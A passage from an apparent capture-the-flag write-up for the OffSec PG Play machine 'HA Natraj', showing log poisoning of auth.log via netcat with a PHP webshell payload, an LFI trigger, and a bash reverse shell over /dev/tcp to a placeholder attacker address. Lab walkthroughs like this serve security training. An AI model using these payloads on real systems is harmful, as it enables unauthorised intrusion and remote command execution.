# :globe_with_meridians: Ha Natraj Lfi Log Poisoning Apache2 User Hijack Sudo Nmap To Root Offsec Pg Play

> **Original Source:** [Ha Natraj Lfi Log Poisoning Apache2 User Hijack Sudo Nmap To Root Offsec Pg Play](https://infosecwriteups.com/ha-natraj-lfi-log-poisoning-apache2-user-hijack-sudo-nmap-to-root-offsec-pg-play-dbbd1fa12bee)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

## 2.5 Poisoning auth.log and Triggering RCE


The SSH client rejects PHP code as an invalid username. Instead, use netcat to send the raw SSH banner and a PHP payload directly to port 22:


```
echo '<?php system($_GET["cmd"]); ?>' | nc <TARGET_IP> 22
```


The server responds with its SSH banner, and the PHP payload is written into `auth.log` as a failed authentication attempt username. With the poison in place, trigger it through the LFI with a command parameter:


## Get Roshan Rajbanshi’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


Start the listener:


```
nc -lvnp 4444
```


Trigger the reverse shell:


```
curl -s "http://<TARGET_IP>/console/file.php?file=/var/log/auth.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/4444+0>%261'"
```


Shell received:


```
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 53560
www-data@ubuntu:/var/www/html/console$
```


Shell as `www-data`. The log poisoning worked — the PHP payload in `auth.log` was included and executed, spawning a bash reverse shell.

---

*Originally published on [Medium](https://infosecwriteups.com/ha-natraj-lfi-log-poisoning-apache2-user-hijack-sudo-nmap-to-root-offsec-pg-play-dbbd1fa12bee). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
